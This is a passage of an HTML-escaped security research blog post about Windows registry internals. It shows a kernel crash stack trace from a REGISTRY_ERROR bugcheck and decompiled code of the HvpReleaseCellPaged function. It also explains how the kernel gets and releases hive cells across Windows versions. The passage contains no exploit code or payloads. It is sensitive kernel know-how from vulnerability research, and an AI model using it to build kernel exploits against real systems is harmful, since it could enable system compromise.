 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c14 ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;03 ffff828b`b100c640 fffff800`80a874d5 &amp;nbsp; &amp;nbsp; nt!KeBugCheckEx+0x107&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c14 ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;04 ffff828b`b100c680 fffff800`8089dfd5 &amp;nbsp; &amp;nbsp; nt!HvpReleaseCellPaged+0x1ec1a5&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c14 ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;05 ffff828b`b100c6c0 fffff800`808a29be &amp;nbsp; &amp;nbsp; nt!CmpQueryKeyValueData+0x1a5&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c14 ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;06 ffff828b`b100c770 fffff800`808a264e &amp;nbsp; &amp;nbsp; nt!CmEnumerateValueKey+0x13e&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c14 ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;07 ffff828b`b100c840 fffff800`80629e75 &amp;nbsp; &amp;nbsp; nt!NtEnumerateValueKey+0x31e&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c14 ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;08 ffff828b`b100ca70 00007ff8`242c4114 &amp;nbsp; &amp;nbsp; nt!KiSystemServiceCopyEnd+0x25&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;09 00000008`c747dc38 00000000`00000000 &amp;nbsp; &amp;nbsp; 0x00007ff8`242c4114&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;p class=&quot;ormwWEjHLs-c3 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span&gt;W&lt;/span&gt;&lt;span&gt;e are seeing bugcheck code 0x51 (REGISTRY_ERROR), which indicates that it was triggered intentionally rather than through a bad memory access.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Additionally, the direct caller of KeBugCheckEx is HvpReleaseCellPaged, a function that we haven&amp;#39;t really mentioned so far in this blog post series.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c36 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span&gt;To better understand what is actually happening here, we need to take a step back and look at the general scheme of cell operations as implemented in the Windows kernel.&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&amp;nbsp;It typically follows a common pattern:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;table class=&quot;ormwWEjHLs-c19&quot;&gt;&lt;tr class=&quot;ormwWEjHLs-c12&quot;&gt;&lt;td class=&quot;ormwWEjHLs-c11&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;&amp;nbsp;&amp;nbsp;_HV_GET_CELL_CONTEXT&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;Context;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c14 ormwWEjHLs-c0 ormwWEjHLs-c25&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c25&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;//&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;//&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c25&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;Translate&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c25&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;the&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c25&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;cell&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c25&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;index&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c25&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;to&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c25&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;virtual&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c25&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;address&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;//&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;PVOID&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;CellAddress&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;Hive-&amp;gt;GetCellRoutine(Hive,&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;CellIndex,&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;&amp;amp;Context);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;//&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;//&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c25&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;Operate&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c25&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;on&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c25&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;the&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c25&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;cell&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c25&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;view&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c25&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;using&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c25&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;the&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c25&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;CellAddress&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c25&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;pointer&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c25&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;//&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;...&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;//&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;//&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c25&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;Release&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c25&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;the&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c25&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;cell&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;//&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;Hive-&amp;gt;ReleaseCellRoutine(Hive,&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;&amp;amp;Context)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;p class=&quot;ormwWEjHLs-c3 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span&gt;T&lt;/span&gt;&lt;span&gt;here are three stages here: translating the cell index to a virtual address, performing operations on that cell, and releasing it.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;We are already familiar with the first two, and they are both obvious, but what is the release about?&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Based on a historical analysis of various Windows kernel builds, &lt;/span&gt;&lt;span&gt;it turns out that in some versions, a get+release function pair &lt;/span&gt;&lt;span&gt;was not only used for translating cell indexes to virtual addresses, but also to ensure that the memory view of the cell would not be accidentally unmapped &lt;/span&gt;&lt;span&gt;between these two calls&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c26&quot;&gt;&lt;span&gt;The presence or absence of the &amp;quot;release&amp;quot; function in consecutive Windows versions is shown below:&lt;/span&gt;&lt;/p&gt;&lt;ul style=&quot;padding: 0;&quot; class=&quot;lst-kix_2fen9zw0vjz4-0 start&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c26 c16 li-bullet-0&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c17&quot;&gt;Windows NT 3.1 &amp;ndash; 2000:&lt;/span&gt;&lt;span&gt;&amp;nbsp;&amp;#10060;&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c26 c16 li-bullet-0&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c17&quot;&gt;Windows XP &amp;ndash; 7:&lt;/span&gt;&lt;span&gt;&amp;nbsp;&amp;#9989;&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c26 c16 li-bullet-0&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c17&quot;&gt;Windows 8 &amp;ndash; 8.1:&lt;/span&gt;&lt;span&gt;&amp;nbsp;&amp;#10060;&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c26 c16 li-bullet-0&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c17&quot;&gt;Windows 10 &amp;ndash; 11:&lt;/span&gt;&lt;span&gt;&amp;nbsp;&amp;#9989;&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;
 &lt;p class=&quot;ormwWEjHLs-c34 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c34&quot;&gt;&lt;span&gt;L&lt;/span&gt;&lt;span&gt;et&amp;#39;s take a look at the decompiled HvpReleaseCellPaged function from Windows 10, 1507 (build 10240), where it first reappeared after a hiatus in Windows 8.x:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;table class=&quot;ormwWEjHLs-c19&quot;&gt;&lt;tr class=&quot;ormwWEjHLs-c12&quot;&gt;&lt;td class=&quot;ormwWEjHLs-c11&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;VOID&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;HvpReleaseCellPaged(_CMHIVE&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;*CmHive,&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;_HV_GET_CELL_CONTEXT&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;*Context)&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;_HCELL_INDEX&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;RealCell;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;_HMAP_ENTRY&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;*MapEntry;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c14 ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;RealCell&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;Context-&amp;gt;Cell&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;0xFFFFFFFE;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;MapEntry&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;HvpGetCellMap(&amp;amp;CmHive-&amp;gt;Hive,&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;RealCell);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c14 ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;(MapEntry&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;NULL)&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;KeBugCheckEx(REGISTRY_ERROR,&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;1,&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;CmHive,&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;RealCell,&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;0x291);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;}&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c14 ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;((Context-&amp;gt;Cell&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;1)&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;0)&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;HvpMapEntryReleaseBinAddress(MapEntry);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;}&lt;/span&gt;&lt;/p&gt;
